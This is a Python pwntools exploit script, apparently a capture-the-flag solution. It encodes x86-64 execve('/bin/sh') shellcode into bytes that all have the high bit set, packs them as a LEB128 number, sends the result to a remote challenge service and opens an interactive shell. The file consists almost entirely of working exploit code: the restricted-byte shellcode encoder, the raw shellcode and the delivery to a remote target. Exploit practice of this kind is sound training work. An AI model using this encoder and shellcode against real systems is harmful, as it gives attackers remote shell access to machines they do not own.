import argparse
import codecs
import leb128
import math
import threading

from pwn import *

# context.log_level = 'debug'
context.log_level = 'error'
context.terminal = ['tmux', 'splitw', '-h']

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")

mtx = threading.Lock()

args = parser.parse_args()

HOST, PORT = args.address.split(':')

# point rdx 0x800 bytes forward
preamble = b'\x80\xf6\x88\x80\xf6\x80'
# [rdx-1] <- b^0x80
write1_lo = lambda b: b'\xb0' + bytes([b | 0x80]) + b'\x80\xf0\x80\x88\x82\xff\xff\xff\xff\x80\xc2\x81\x80\xc2\x80'
# [rdx-1] <- b
write1_hi = lambda b: b'\xb0' + bytes([b]) + b'\x88\x82\xff\xff\xff\xff\x80\xc2\x81\x80\xc2\x80'
# switch between hi / lo
write1 = lambda b: write1_hi(b) if b >= 0x80 else write1_lo(b)
# put rdx back at the start and jmp rdx
epilog = b'\x80\xe2\x80\x80\xca\x80\x80\xf2\x80\xff\xe2\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'

# shellcode NOT from binja because binja's shellcode didn't work
# thanks a lot, binja
sc = b'\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

payload = preamble + b''.join(write1(c) for c in sc) + epilog

# sanity
for i in range(len(payload)):
    assert payload[i] & 0x80 == 0x80

decoded = leb128.u.decode(payload)

print(payload)
print(hex(decoded))

encoded = leb128.u.encode(decoded)
# sanity number 2
assert encoded[:-2] == payload[:-2]

hexed = hex(decoded)[2:]
hexed = "0" * (len(hexed) % 2) + hexed

decoded_bytes = codecs.decode(hexed, 'hex')
# decoded_bytes = decoded_bytes[::-1]
print(decoded_bytes)

r = remote(HOST, int(PORT))

# r = process(['./challenge'])
# gdb.attach(r, f'''
# b *main + 270
# c
# si {len(sc) * 6}
# ''')


r.send(decoded_bytes)

r.interactive()
